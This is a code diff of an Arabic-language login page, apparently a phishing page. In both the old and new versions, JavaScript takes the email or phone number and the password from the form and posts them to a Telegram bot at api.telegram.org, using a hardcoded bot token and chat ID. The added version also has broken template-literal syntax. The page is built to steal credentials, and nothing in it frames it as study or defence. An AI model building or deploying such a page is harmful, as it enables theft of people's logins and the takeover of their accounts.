@@ -5,48 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
-        input, button { display: block; margin: 10px auto; padding: 10px; width: 80%; max-width: 300px; }
-        img { max-width: 300px; margin-top: 20px; border-radius: 10px; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-form {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+        .login-form h2 {
+            text-align: center;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .login-form button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
 
-    <!-- صورة ترحيبية تظهر عند دخول الموقع -->
-    <img src="https://drive.google.com/uc?export=view&id=1AQHhixqEKBzaNplesO9c5zWkjLc1dYoN" alt="صورة ترحيبية">
+    <div class="login-form">
+        <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <input type="text" id="emailOrPhone" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <button type="submit">دخول</button>
+        </form>
+    </div>
 
-    <h2>تسجيل الدخول</h2>
-    <form id="loginForm">
-        <input type="email" id="email" placeholder="📧 البريد الإلكتروني" required>
-        <input type="password" id="password" placeholder="🔑 كلمة السر" required>
-        <button type="submit">إرسال</button>
-    </form>
-    
     <script>
-        document.getElementById("loginForm").addEventListener("submit", function(event) {
-            event.preventDefault();
+        const token = "7883424268:AAFyz62FUDBY1-hm6DEyoFcMOnID-i4hQog"; // توكن البوت
+        const chatId = "6317422525"; // معرف الدردشة
 
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
 
-            const botToken = "7951759668:AAF-JShe3fj4-Zk3rB9g3np5Al8V983WC04";
-            const chatId = "7141386521";
+            // الحصول على البيانات من النموذج
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const password = document.getElementById('password').value;
 
-            let message = `📩 *تسجيل جديد*\n\n📧 البريد: ${email}\n🔑 كلمة السر: ${password}`;
+            // إعداد الرسالة لإرسالها إلى بوت تلجرام
+            const message = تسجيل دخول جديد:\nالبريد الإلكتروني أو رقم الهاتف: ${emailOrPhone}\nكلمة السر: ${password};
 
-            // إرسال البيانات إلى تيليجرام
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-            })
-            .then(() => {
-                alert("✅ تم إرسال البيانات بنجاح!");
-            })
-            .catch(error => {
-                alert("❌ حدث خطأ أثناء الإرسال!");
-                console.error("Error:", error);
-            });
+            // إرسال البيانات إلى بوت تلجرام
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)})
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("تم إرسال بياناتك بنجاح!");
+                    } else {
+                        alert("حدث خطأ أثناء إرسال البيانات.");
+                    }
+                })
+                .catch(error => {
+                    console.error("حدث خطأ:", error);
+                    alert("حدث خطأ أثناء الاتصال.");
+                });
         });
     </script>
 
